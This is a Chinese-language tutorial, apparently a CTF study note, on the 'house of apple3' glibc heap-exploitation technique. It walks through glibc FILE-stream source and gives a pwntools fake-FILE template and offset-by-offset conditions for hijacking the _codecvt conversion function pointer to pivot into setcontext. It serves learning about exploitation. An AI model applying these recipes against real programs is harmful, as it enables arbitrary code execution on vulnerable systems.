## 介绍

之前已经学过了 house of apple2，主要是通过劫持 `_IO_FILE->_wide_data`，利用其对 `_IO_FILE->_wide_data->_wide_vtable` 检查不严格的漏洞劫持程序控制流，主要劫持的是 `_IO_wfile_overflow`、`_IO_wfile_underflow_mmap`、`_IO_wdefault_xsgetn` 这几个函数调用的函数指针。

house of apple3 则重点关注 `_IO_FILE->_codecvt` 成员，可以做到不劫持 `_IO_FILE->vtable` 完成利用（链子三）。

## 利用链分析

首先来看 `_IO_wfile_jumps` 里的 `_IO_wfile_underflow` 这个函数，如下：

```c
wint_t
_IO_wfile_underflow (FILE *fp)
{
  struct _IO_codecvt *cd;
  enum __codecvt_result status;
  ssize_t count;

  /* C99 requires EOF to be "sticky".  */
  if (fp->_flags & _IO_EOF_SEEN)  // [1]
    return WEOF;

  if (__glibc_unlikely (fp->_flags & _IO_NO_READS))  // [2]
    {
      fp->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  if (fp->_wide_data->_IO_read_ptr < fp->_wide_data->_IO_read_end)  // [3]
    return *fp->_wide_data->_IO_read_ptr;

  cd = fp->_codecvt;

  /* Maybe there is something left in the external buffer.  */
  if (fp->_IO_read_ptr < fp->_IO_read_end)  // [4]
    {
      /* There is more in the external.  Convert it.  */
      const char *read_stop = (const char *) fp->_IO_read_ptr;

      fp->_wide_data->_IO_last_state = fp->_wide_data->_IO_state;
      fp->_wide_data->_IO_read_base = fp->_wide_data->_IO_read_ptr =
	fp->_wide_data->_IO_buf_base;
      status = __libio_codecvt_in (cd, &fp->_wide_data->_IO_state,  // [5]
				   fp->_IO_read_ptr, fp->_IO_read_end,
				   &read_stop,
				   fp->_wide_data->_IO_read_ptr,
				   fp->_wide_data->_IO_buf_end,
				   &fp->_wide_data->_IO_read_end);
		...
	}
	...
}
libc_hidden_def (_IO_wfile_underflow)
```

[1] [2] [3] [4] 需要设置参数，绕过一下。

注意这里 [5] 的地方，跟进 `__libio_codecvt_in` 函数如下：

```c
enum __codecvt_result
__libio_codecvt_in (struct _IO_codecvt *codecvt, __mbstate_t *statep,
		    const char *from_start, const char *from_end,
		    const char **from_stop,
		    wchar_t *to_start, wchar_t *to_end, wchar_t **to_stop)
{
  enum __codecvt_result result;

  struct __gconv_step *gs = codecvt->__cd_in.step;
  int status;
  size_t dummy;
  const unsigned char *from_start_copy = (unsigned char *) from_start;

  codecvt->__cd_in.step_data.__outbuf = (unsigned char *) to_start;
  codecvt->__cd_in.step_data.__outbufend = (unsigned char *) to_end;
  codecvt->__cd_in.step_data.__statep = statep;

  __gconv_fct fct = gs->__fct;  // [8]
  if (gs->__shlib_handle != NULL)  // [6]
    PTR_DEMANGLE (fct);

  status = DL_CALL_FCT (fct,  // [7]
			(gs, &codecvt->__cd_in.step_data, &from_start_copy,
			 (const unsigned char *) from_end, NULL,
			 &dummy, 0, 0));
	...
}

#  define PTR_MANGLE(var) \
  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)
#  define PTR_DEMANGLE(var)     PTR_MANGLE (var)
```

注意这里调用了一个宏，是一个函数指针：

```c
# define DL_CALL_FCT(fctp, args) \
  (_dl_mcount_wrapper_check ((void *) (fctp)), (*(fctp)) args)
```

也就是说实际调用的函数指针是 `fct`，它是 `struct __gconv_step` 结构体的成员，这个结构体定义如下：

```c
struct _IO_codecvt
{
  _IO_iconv_t __cd_in;
  _IO_iconv_t __cd_out;
};

typedef struct
{
  struct __gconv_step *step;
  struct __gconv_step_data step_data;
} _IO_iconv_t;


/* Description of a conversion step.  */
struct __gconv_step
{
  struct __gconv_loaded_object *__shlib_handle;
  const char *__modname;

  /* For internal use by glibc.  (Accesses to this member must occur
     when the internal __gconv_lock mutex is acquired).  */
  int __counter;

  char *__from_name;
  char *__to_name;

  __gconv_fct __fct;  // [9]
  __gconv_btowc_fct __btowc_fct;
  __gconv_init_fct __init_fct;
  __gconv_end_fct __end_fct;

  /* Information about the number of bytes needed or produced in this
     step.  This helps optimizing the buffer sizes.  */
  int __min_needed_from;
  int __max_needed_from;
  int __min_needed_to;
  int __max_needed_to;

  /* Flag whether this is a stateful encoding or not.  */
  int __stateful;

  void *__data;		/* Pointer to step-local data.  */
};
```

如上，它的定义在 [9] 处。

也就是说，只需要劫持 `stdxxx->codecvt->__cd_in.step->__fct` 就可以劫持控制流。

类似 `__libio_codecvt_in` 的函数还有 `__libio_codecvt_out`、`__libio_codecvt_length` 等等。

总结如下：

### 利用 `_IO_wfile_underflow` 函数控制程序执行流

板子如下：

```python
fakeio = flat({
	0: 0,
	0x10: -1,
	0x98: fake_codecvt,
	0xa0: old_wide_data or heap_chunk,
	0xd8: libc.sym['_IO_wfile_jumps'] - 0x40  # 保证能调用 _IO_wfile_underflow
}, filler=b"\x00")

fake_codecvt = flat({
	0: fake_cd_in_step
}, filler=b"\x00")

fake_cd_in_step = flat({
	0x28: libc.sym['setcontext'] + 0x35
}, filler=b"\x00")
```

注意在调用函数指针时 `call r12`，此时寄存器的 rdi 是 `gs`，`rsi` 是 `&codecvt->__cd_in.step_data`。

### `_IO_wfile_underflow_mmap`

比较类似，不赘述。

### 利用 `IO_wdo_write` 函数控制程序执行流


`_IO_wdo_write` 的调用点很多，这里选择一个相对简单的链：

```
_IO_new_file_sync
    _IO_do_flush
        _IO_wdo_write
          __libio_codecvt_out
              DL_CALL_FCT
                  gs = fp->_codecvt->__cd_out.step
                  *(gs->__fct)(gs)
```

这里的 `_IO_new_file_sync` 函数就在 `_IO_file_jumps` 里，如果走 `fcloseall -> _IO_cleanup -> _IO_unbuffer_all -> _IO_new_file_setbuf -> _IO_default_setbuf` 这种链子的话就可以做到不修改 `fp->vtable` 完成利用。

`_IO_new_file_sync` 分析如下：

```c
int
_IO_new_file_sync (FILE *fp)
{
  ssize_t delta;
  int retval = 0;

  /*    char* ptr = cur_ptr(); */
  if (fp->_IO_write_ptr > fp->_IO_write_base)  // [10]
    if (_IO_do_flush(fp)) return EOF;
	...
}

#define _IO_do_flush(_f) \
  ((_f)->_mode <= 0							      \  // [11]
   ? _IO_do_write(_f, (_f)->_IO_write_base,				      \  
		  (_f)->_IO_write_ptr-(_f)->_IO_write_base)		      \
   : _IO_wdo_write(_f, (_f)->_wide_data->_IO_write_base,		      \  // [12]
		   ((_f)->_wide_data->_IO_write_ptr			      \
		    - (_f)->_wide_data->_IO_write_base)))


int
_IO_wdo_write (FILE *fp, const wchar_t *data, size_t to_do)
{
  struct _IO_codecvt *cc = fp->_codecvt;
 
  if (to_do > 0)  // [13]
    {
      if (fp->_IO_write_end == fp->_IO_write_ptr
      && fp->_IO_write_end != fp->_IO_write_base)  // [14]
    {// 不能进入这个分支
      if (_IO_new_do_write (fp, fp->_IO_write_base,
                fp->_IO_write_ptr - fp->_IO_write_base) == EOF)
        return WEOF;
    }
 
  // ......
 
      /* Now convert from the internal format into the external buffer.  */
    // 需要调用到这里
      result = __libio_codecvt_out (cc, &fp->_wide_data->_IO_state,  // [15]
                    data, data + to_do, &new_data,
                    write_ptr,
                    buf_end,
                    &write_ptr);
          //......
  }
}
```

对fp的设置如下：

1. `vtable` 设置为 `_IO_file_jumps` 地址（加减偏移），使其能成功调用 `_IO_new_file_sync` 即可
2. `_IO_write_ptr` > `_IO_write_base`，即满足 `*(fp + 0x28) > *(fp + 0x20)`
3. `_mode > 0`，即满足(fp + 0xc0) > 0
4. `_IO_write_end != _IO_write_ptr` 或者 `_IO_write_end == _IO_write_base`，即满足 `*(fp + 0x30) != *(fp + 0x28)` 或者 `*(fp + 0x30) == *(fp + 0x20)`
5. `_wide_data` 设置为堆地址，假设地址为 A，即满足 `*(fp + 0xa0) = A`
6. `_wide_data->_IO_write_ptr >= _wide_data->_IO_write_base`，即满足 `*(A + 0x20) >= *(A + 0x18)`
7. `_codecvt` 设置为可控堆地址 B，即满足 `*(fp + 0x98) = B`
8. `codecvt->__cd_out.step` 设置为可控堆地址 C，即满足 `*(B + 0x38) = C`
9. `codecvt->__cd_out.step->__shlib_handle` 设置为 0，即满足 `*C = 0`
10. `codecvt->__cd_out.step->__fct` 设置为地址 D，地址 D 用于控制 rip，即满足 `*(C + 0x28) = D`。当调用到D的时候，此时的 rdi 为 C。如果 `_wide_data` 也可控的话，rsi 也能控制。


### 使用 `_IO_wfile_sync` 函数控制程序执行流

对fp的设置如下：

1. `_flags` 设置为 `~(4 | 0x10)`
2. `vtable` 设置为 `_IO_wfile_jumps` 地址（加减偏移），使其能成功调用 `_IO_wfile_sync 即可
3. `_wide_data`设置为堆地址，假设其地址为A，即满足 `*(fp + 0xa0) = A`
4. `_wide_data->_IO_write_ptr <= _wide_data->_IO_write_base`，即满足 `*(A + 0x20) <= *(A + 0x18)`
5. `_wide_data->_IO_read_ptr != _wide_data->_IO_read_end`，即满足 `*A != *(A + 8)`
6. `_codecvt` 设置为可控堆地址 B，即满足 `*(fp + 0x98) = B`
7. `codecvt->__cd_in.step` 设置为可控堆地址 C，即满足 `*B = C`
8. `codecvt->__cd_in.step->__stateful` 设置为非 0，即满足 `*(B + 0x58) != 0`
9. `codecvt->__cd_in.step->__shlib_handle` 设置为 0，即满足 `*C = 0`
10. `codecvt->__cd_in.step->__fct` 设置为地址 D，地址 D 用于控制 rip，即满足 `*(C + 0x28) = D`。当调用到 D 的时候，此时的 rdi 为 C。如果 rsi 为 `&codecvt->__cd_in.step_data` 可控。


调用链如下：

```
_IO_wfile_sync
    __libio_codecvt_length
        DL_CALL_FCT
            gs = fp->_codecvt->__cd_in.step
            *(gs->__fct)(gs)
```
